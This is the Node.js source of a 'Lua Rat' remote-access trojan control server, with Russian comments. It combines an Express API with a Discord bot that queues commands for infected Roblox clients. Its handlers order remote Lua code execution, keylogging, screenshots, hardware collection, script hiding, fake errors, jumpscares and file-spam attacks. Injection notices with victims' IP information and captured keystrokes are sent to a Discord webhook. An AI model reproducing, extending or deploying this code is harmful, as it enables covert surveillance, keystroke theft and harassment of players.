const express = require('express');
const fetch = require('node-fetch');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const cors = require('cors');

// ========== КОНФИГУРАЦИЯ ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const WEBHOOK_URL = process.env.WEBHOOK_URL;
const PORT = process.env.PORT || 10000;

const SERVER_URL = process.env.RENDER_EXTERNAL_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` || `http://localhost:${PORT}`;

console.log('Lua Rat Server v3.2 запускается...');
console.log('Конфигурация:');
console.log(`- PORT: ${PORT}`);
console.log(`- SERVER_URL: ${SERVER_URL}`);
console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅' : '❌'}`);
console.log(`- WEBHOOK_URL: ${WEBHOOK_URL ? '✅' : '❌'}`);

// ========== ЗАЩИТА ОТ СПАМА ==========
let rateLimitMap = new Map();
let recentInjects = new Map();
let lastSpamWarning = 0;

function isRateLimited(ip, playerName) {
    const now = Date.now();
    
    if (rateLimitMap.has(ip)) {
        const lastRequest = rateLimitMap.get(ip);
        if (now - lastRequest < 30000) {
            if (now - lastSpamWarning > 10000) {
                console.log(`Спам: IP ${ip}`);
                lastSpamWarning = now;
            }
            return true;
        }
    }
    
    if (recentInjects.has(playerName)) {
        const lastInject = recentInjects.get(playerName);
        if (now - lastInject < 60000) {
            console.log(`${playerName} уже инжектился`);
            return true;
        }
    }
    
    rateLimitMap.set(ip, now);
    recentInjects.set(playerName, now);
    return false;
}

setInterval(() => {
    const now = Date.now();
    for (let [ip, time] of rateLimitMap.entries()) {
        if (now - time > 300000) rateLimitMap.delete(ip);
    }
    for (let [player, time] of recentInjects.entries()) {
        if (now - time > 300000) recentInjects.delete(player);
    }
}, 60000);

// ========== ХРАНИЛИЩЕ ==========
let commandQueue = [];
let lastScreenshot = null;
global.onlineUsers = new Map();

// ========== EXPRESS ==========
const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// ========== DISCORD ВЕБХУК ==========
async function sendDiscordWebhook(title, description, color = 0x3498db, fields = []) {
    if (!WEBHOOK_URL) {
        console.log('WEBHOOK_URL не настроен');
        return false;
    }
    
    try {
        const embed = {
            title: title,
            description: description,
            color: color,
            fields: fields,
            timestamp: new Date().toISOString(),
            footer: { text: "Lua Rat System v3.2" }
        };
        
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                username: "Lua Rat System",
                embeds: [embed]
            })
        });
        
        if (response.ok) {
            console.log(`Вебхук: ${title}`);
            return true;
        }
        return false;
    } catch (error) {
        console.error('Ошибка вебхука:', error.message);
        return false;
    }
}

// ========== DISCORD БОТ ==========
let discordClient = null;

function isValidUsername(str) {
    if (!str || typeof str !== 'string') return false;
    if (str.length < 3 || str.length > 20) return false;
    if (!/^[a-zA-Z0-9_]+$/.test(str)) return false;
    return true;
}

function parseCommandWithTarget(message) {
    const args = message.content.slice(1).split(' ');
    const command = args.shift().toLowerCase();
    
    if (args.length === 0) return { command, args, target: null };
    
    const noTargetCommands = ['users', 'status', 'help', 'test', 'print'];
    const textFirstCommands = ['message', 'fakeerror', 'execute', 'popup'];
    
    if (noTargetCommands.includes(command) || textFirstCommands.includes(command)) {
        return { command, args, target: null };
    }
    
    if (isValidUsername(args[0])) {
        const target = args.shift();
        return { command, args, target };
    }
    
    return { command, args, target: null };
}

if (DISCORD_TOKEN) {
    discordClient = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ] 
    });

    async function sendCommand(command, args = [], target = null) {
        try {
            const payload = { command, args };
            if (target) payload.target = target;
            
            const response = await fetch(`${SERVER_URL}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            console.log(`Команда ${command} -> ${target || 'всем'}`);
            return response.ok;
        } catch (error) {
            console.error(`Ошибка: ${error.message}`);
            return false;
        }
    }

    async function getOnlineUsers() {
        try {
            const response = await fetch(`${SERVER_URL}/users`);
            if (response.ok) return await response.json();
            return { users: [], count: 0 };
        } catch (error) {
            return { users: [], count: 0 };
        }
    }

    discordClient.on('ready', () => {
        console.log(`Бот ${discordClient.user.tag} запущен!`);
        discordClient.user.setActivity('/help | Lua Rat v3.2', { type: 'WATCHING' });
    });

    discordClient.on('messageCreate', async message => {
        if (message.author.bot || !message.content.startsWith('/')) return;
        
        const { command, args, target } = parseCommandWithTarget(message);
        
        const handlers = {
            // ========== ИНФОРМАЦИОННЫЕ КОМАНДЫ ==========
            users: async () => {
                const data = await getOnlineUsers();
                const embed = new EmbedBuilder()
                    .setTitle('👥 Онлайн пользователи')
                    .setColor(0x00ff00);
                
                if (data.count > 0) {
                    embed.setDescription(`**Всего онлайн:** ${data.count}`);
                    const userList = data.users.slice(0, 15).map(u => 
                        `• **${u.player}** - ${u.place || 'Unknown'} (${u.executor || 'Unknown'})`
                    ).join('\n');
                    embed.addFields({ name: 'Список игроков:', value: userList + (data.users.length > 15 ? `\n\n... и еще ${data.users.length - 15}` : '') });
                } else {
                    embed.setDescription('❌ Нет активных игроков');
                    embed.setColor(0xff0000);
                }
                await message.reply({ embeds: [embed] });
            },
            
            status: async () => {
                const embed = new EmbedBuilder()
                    .setTitle('📊 Статус системы')
                    .setColor(0x7289da)
                    .addFields(
                        { name: '👥 Онлайн игроков', value: `${global.onlineUsers.size}`, inline: true },
                        { name: '📨 Очередь команд', value: `${commandQueue.length}`, inline: true },
                        { name: '🤖 Discord бот', value: '🟢 Активен', inline: true },
                        { name: '📊 Версия', value: '`3.2.0`', inline: true },
                        { name: '🛡️ Защита', value: 'Rate Limited', inline: true }
                    );
                await message.reply({ embeds: [embed] });
            },
            
            test: async () => {
                if (await sendCommand("popup", ["Тест от Discord бота! ✅"], target)) {
                    await message.reply(`✅ Тест отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                } else {
                    await message.reply('❌ Ошибка отправки');
                }
            },
            
            print: async () => {
                if (await sendCommand("print", [], target)) {
                    await message.reply(`📡 Проверка связи отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                } else {
                    await message.reply('❌ Ошибка');
                }
            },
            
            // ========== УПРАВЛЕНИЕ ИГРОКОМ ==========
            kick: async () => {
                const reason = args.join(' ') || 'Нарушение правил';
                if (await sendCommand("kick", [reason], target)) {
                    await message.reply(`🦶 Кик отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}\nПричина: ${reason}`);
                }
            },
            
            freeze: async () => {
                let seconds = parseInt(args[0]) || 5;
                seconds = Math.min(seconds, 60);
                if (await sendCommand("freeze", [seconds], target)) {
                    await message.reply(`❄️ Заморозка отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}\nДлительность: ${seconds} сек`);
                }
            },
            
            void: async () => {
                if (await sendCommand("void", [], target)) {
                    await message.reply(`🌀 Телепорт в бездну отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                }
            },
            
            spin: async () => {
                if (await sendCommand("spin", [], target)) {
                    await message.reply(`🔄 Вращение отправлено ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                }
            },
            
            fling: async () => {
                if (await sendCommand("fling", [], target)) {
                    await message.reply(`🚀 Подбрасывание отправлено ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                }
            },
            
            sit: async () => {
                if (await sendCommand("sit", [], target)) {
                    await message.reply(`🪑 Смена позы отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                }
            },
            
            dance: async () => {
                if (await sendCommand("dance", [], target)) {
                    await message.reply(`💃 Танец отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                }
            },
            
            cameralock: async () => {
                const action = args[0] || "toggle";
                if (await sendCommand("cameralock", [action], target)) {
                    await message.reply(`🎥 Блокировка камеры отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}\nДействие: ${action}`);
                }
            },
            
            camerashake: async () => {
                let duration = parseInt(args[0]) || 5;
                let intensity = parseInt(args[1]) || 2;
                duration = Math.min(duration, 30);
                intensity = Math.min(intensity, 10);
                if (await sendCommand("camerashake", [duration, intensity], target)) {
                    await message.reply(`📷 Тряска камеры отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}\nДлительность: ${duration} сек | Интенсивность: ${intensity}`);
                }
            },
            
            tpgame: async () => {
                const placeId = args[0];
                if (!placeId || !/^\d+$/.test(placeId)) {
                    await message.reply('❌ Укажите корректный ID места (только цифры)');
                    return;
                }
                if (await sendCommand("tpgame", [placeId], target)) {
                    await message.reply(`🌀 Телепорт в игру отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}\nID места: ${placeId}`);
                }
            },
            
            // ========== АУДИО/ВИДЕО ==========
            mute: async () => {
                if (await sendCommand("mute", [], target)) {
                    await message.reply(`🔇 Звуки выключены ${target ? `для **${target}**` : '**для всех игроков**'}`);
                }
            },
            
            unmute: async () => {
                if (await sendCommand("unmute", [], target)) {
                    await message.reply(`🔊 Звуки включены ${target ? `для **${target}**` : '**для всех игроков**'}`);
                }
            },
            
            playaudio: async () => {
                const audioId = args[0] || "184702873";
                if (await sendCommand("playaudio", [audioId], target)) {
                    await message.reply(`🔊 Аудио отправлено ${target ? `игроку **${target}**` : '**всем игрокам**'}\nID: ${audioId}`);
                }
            },
            
            blur: async () => {
                let seconds = parseInt(args[0]) || 5;
                seconds = Math.min(seconds, 30);
                if (await sendCommand("blur", [seconds], target)) {
                    await message.reply(`🔵 Размытие экрана отправлено ${target ? `игроку **${target}**` : '**всем игрокам**'}\nДлительность: ${seconds} сек`);
                }
            },
            
            screenshot: async () => {
                if (await sendCommand("screenshot", [], target)) {
                    await message.reply(`📸 Скриншот запрошен ${target ? `у **${target}**` : '**у всех игроков**'}\nРезультат будет через 5 секунд`);
                }
            },
            
            // ========== ЧАТ ==========
            chat: async () => {
                if (await sendCommand("chat", [], target)) {
                    await message.reply(`💬 Чат ${target ? `у **${target}**` : '**у всех игроков**'} переключен`);
                }
            },
            
            message: async () => {
                const text = args.join(' ');
                if (!text) {
                    await message.reply('❌ Укажите текст сообщения');
                    return;
                }
                if (text.length > 100) {
                    await message.reply('❌ Сообщение слишком длинное (макс. 100 символов)');
                    return;
                }
                if (await sendCommand("popup", [text], target)) {
                    await message.reply(`📩 Сообщение отправлено ${target ? `игроку **${target}**` : '**всем игрокам**'}\nТекст: ${text}`);
                }
            },
            
            // ========== СКРИМЕРЫ ==========
            jumpscare: async () => {
                let scareType = parseInt(args[0]) || 1;
                if (scareType < 1 || scareType > 2) scareType = 1;
                const scareNames = { 1: "Джефф Килер 👹", 2: "Соник.exe 💀" };
                const name = scareNames[scareType];
                if (await sendCommand("jumpscare", [scareType], target)) {
                    await message.reply(`👻 Скример ${name} запущен ${target ? `для **${target}**` : '**для всех игроков**'}`);
                }
            },
            
            // ========== СИСТЕМНЫЕ ==========
            execute: async () => {
                const code = args.join(' ');
                if (!code) {
                    await message.reply('❌ Укажите код для выполнения');
                    return;
                }
                if (code.length > 500) {
                    await message.reply('❌ Код слишком длинный (макс. 500 символов)');
                    return;
                }
                if (await sendCommand("execute", [code], target)) {
                    await message.reply(`🔧 Код отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}\n\`\`\`lua\n${code.substring(0, 100)}${code.length > 100 ? '...' : ''}\n\`\`\``);
                }
            },
            
            fakeerror: async () => {
                const errorText = args.join(' ') || 'Системная ошибка';
                if (await sendCommand("fakeerror", [errorText], target)) {
                    await message.reply(`⚠️ Фейковая ошибка отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}\nСообщение: ${errorText}`);
                }
            },
            
            keylog: async () => {
                if (await sendCommand("keylog", [], target)) {
                    await message.reply(`⌨️ Кейлоггер активирован ${target ? `для **${target}**` : '**для всех игроков**'}\nЛоги будут приходить каждые 5 минут`);
                }
            },
            
            stopkeylog: async () => {
                if (await sendCommand("stopkeylog", [], target)) {
                    await message.reply(`🛑 Кейлоггер деактивирован ${target ? `для **${target}**` : '**для всех игроков**'}`);
                }
            },
            
            hardware: async () => {
                if (await sendCommand("hardware", [], target)) {
                    await message.reply(`🖥️ Данные об оборудовании запрошены ${target ? `у **${target}**` : '**у всех игроков**'}`);
                }
            },
            
            hide: async () => {
                if (await sendCommand("hide", [], target)) {
                    await message.reply(`👻 Скрытие скрипта выполнено ${target ? `для **${target}**` : '**для всех игроков**'}`);
                }
            },
            
            // ========== SPAM ==========
            memory: async () => {
                let fileCount = parseInt(args[0]) || 100;
                fileCount = Math.min(fileCount, 1000);
                if (await sendCommand("memory_spam", [fileCount], target)) {
                    await message.reply(`💾 Memory Spam запущен ${target ? `для **${target}**` : '**для всех игроков**'}\nКоличество файлов: ${fileCount}`);
                }
            },
            
            gallery: async () => {
                let imageCount = parseInt(args[0]) || 10;
                imageCount = Math.min(imageCount, 50);
                if (await sendCommand("gallery_spam", [imageCount], target)) {
                    await message.reply(`🖼️ Gallery Spam запущен ${target ? `для **${target}**` : '**для всех игроков**'}\nКоличество файлов: ${imageCount}`);
                }
            },
            
            // ========== HELP ==========
            help: async () => {
                const embed = new EmbedBuilder()
                    .setTitle('Lua Rat Panel v3.2')
                    .setDescription('**Полный список всех команд с поддержкой таргетинга**')
                    .setColor(0x7289da)
                    .addFields(
                        { 
                            name: '🎯 Формат команд:', 
                            value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами\n\n**Примеры:**\n`/fakeerror текст` - для всех\n`/fakeerror PlayerName текст` - для игрока\n`/cameralock on` - для всех\n`/cameralock PlayerName off` - для игрока', 
                            inline: false 
                        },
                        { 
                            name: '👤 Управление игроком (10 команд)', 
                            value: '`/tpgame [ник] <id места>`\n`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] <on/off>`\n`/camerashake [ник] <секунды> <интенсивность>`', 
                            inline: false 
                        },
                        { 
                            name: '🔊 Аудио/Видео (5 команд)', 
                            value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] <id>`\n`/blur [ник] <секунды>`\n`/screenshot [ник]`', 
                            inline: false 
                        },
                        { 
                            name: '💬 Чат (2 команды)', 
                            value: '`/chat [ник]`\n`/message [ник] <текст>`', 
                            inline: false 
                        },
                        { 
                            name: '👻 Скримеры (1 команда)', 
                            value: '`/jumpscare [ник] <тип>`\n**Типы:** 1=Джефф Килер, 2=Соник.exe', 
                            inline: false 
                        },
                        { 
                            name: '⚙️ Системные (6 команд)', 
                            value: '`/execute [ник] <код>`\n`/fakeerror [ник] <текст>`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/hide [ник]`', 
                            inline: false 
                        },
                        { 
                            name: '💥 Spam (2 команды)', 
                            value: '`/memory [ник] <кол-во>`\n`/gallery [ник] <кол-во>`', 
                            inline: false 
                        },
                        { 
                            name: '👥 Информация (4 команды)', 
                            value: '`/users` - онлайн игроки\n`/status` - статус системы\n`/test` - тест\n`/print` - проверка связи', 
                            inline: false 
                        }
                    )
                    .setFooter({ text: `Всего команд: 28 | Сервер: ${SERVER_URL} | Версия: 3.2.0` });
                
                await message.reply({ embeds: [embed] });
            }
        };
        
        try {
            if (handlers[command]) {
                await handlers[command]();
            } else if (command) {
                await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
            }
        } catch (error) {
            console.error(error);
            await message.reply('❌ Ошибка выполнения команды');
        }
    });

    discordClient.login(DISCORD_TOKEN).catch(e => console.error('Ошибка бота:', e.message));
}

// ========== API МАРШРУТЫ ==========

app.get('/data', (req, res) => {
    const player = req.query.player;
    if (!player) return res.json({ command: "", args: [] });
    
    if (global.onlineUsers.has(player)) {
        global.onlineUsers.get(player).lastSeen = Date.now();
    }
    
    const commandIndex = commandQueue.findIndex(cmd => !cmd.target || cmd.target === player || cmd.target === 'all');
    
    if (commandIndex !== -1) {
        const cmd = commandQueue[commandIndex];
        commandQueue.splice(commandIndex, 1);
        console.log(`${cmd.command} -> ${player}`);
        res.json({ command: cmd.command, args: cmd.args || [] });
    } else {
        res.json({ command: "", args: [] });
    }
});

app.post('/command', async (req, res) => {
    const { command, args, target } = req.body;
    const clientIp = req.ip || req.connection.remoteAddress;
    
    if (command === "inject_notify" && args && args.length >= 5) {
        const playerName = args[0];
        
        if (!isValidUsername(playerName)) {
            return res.json({ status: "OK", filtered: true });
        }
        
        if (isRateLimited(clientIp, playerName)) {
            return res.json({ status: "OK", rate_limited: true });
        }
        
        const [_, gameName, ipInfo, executor, device] = args;
        
        const description = `**Игрок:** ${playerName}\n**Игра:** ${gameName || "Unknown"}\n**Инжектор:** ${executor || "Unknown"}\n**Устройство:** ${device || "PC"}\n\n**IP информация:**\n${ipInfo || "N/A"}`;
        
        await sendDiscordWebhook("Новый инжект!", description, 0x00ff00);
        
        return res.json({ status: "OK" });
    }
    
    if (command && command !== "inject_notify") {
        commandQueue.push({
            command: command,
            args: args || [],
            target: target || null,
            timestamp: Date.now()
        });
        
        if (commandQueue.length > 100) commandQueue = commandQueue.slice(-50);
    }
    
    res.json({ status: "OK", queue_size: commandQueue.length });
});

app.post('/users', (req, res) => {
    const { player, place, executor, device } = req.body;
    
    if (!player || !isValidUsername(player)) {
        return res.status(400).json({ error: "Invalid player" });
    }
    
    global.onlineUsers.set(player, {
        player: player,
        place: place || "Unknown",
        executor: executor || "Unknown",
        device: device || "PC",
        lastSeen: Date.now()
    });
    
    res.json({ status: "OK" });
});

app.get('/users', (req, res) => {
    const now = Date.now();
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 120000) global.onlineUsers.delete(key);
    }
    
    res.json({
        users: Array.from(global.onlineUsers.values()),
        count: global.onlineUsers.size
    });
});

app.post('/screenshot', (req, res) => {
    const { image } = req.body;
    lastScreenshot = image;
    res.json({ status: "OK" });
});

app.get('/screenshot', (req, res) => {
    res.json({ image: lastScreenshot || null });
});

app.post('/keylog', async (req, res) => {
    const { logs } = req.body;
    if (logs && logs.length > 0) {
        await sendDiscordWebhook("Кейлоггер", `\`\`\`${logs.slice(0, 1900)}\`\`\``, 0xe74c3c);
    }
    res.json({ status: "OK" });
});

app.post('/hardware', async (req, res) => {
    const { player, data } = req.body;
    if (player && data) {
        await sendDiscordWebhook("Hardware Info", `**Игрок:** ${player}\n**FPS:** ${data.fps || 0}\n**Пинг:** ${data.ping || 0}\n**Экзекутор:** ${data.executor || "Unknown"}`, 0x9b59b6);
    }
    res.json({ status: "OK" });
});

app.get('/status', (req, res) => {
    const now = Date.now();
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 120000) global.onlineUsers.delete(key);
    }
    
    res.json({
        status: "online",
        version: "3.2.0",
        online_users: global.onlineUsers.size,
        pending_commands: commandQueue.length,
        uptime: Math.floor(process.uptime())
    });
});

app.get('/health', (req, res) => {
    res.send('OK');
});

app.get('/', (req, res) => {
    res.json({
        name: "Lua Rat Control System",
        version: "3.2.0",
        status: "operational",
        endpoints: ["/data", "/command", "/users", "/status", "/health"]
    });
});

app.listen(PORT, () => {
    console.log(`\nСервер запущен на ${PORT}`);
    console.log(`URL: ${SERVER_URL}`);
    console.log(`Discord: ${DISCORD_TOKEN ? '✅' : '❌'}`);
    console.log(`Webhook: ${WEBHOOK_URL ? '✅' : '❌'}\n`);
});
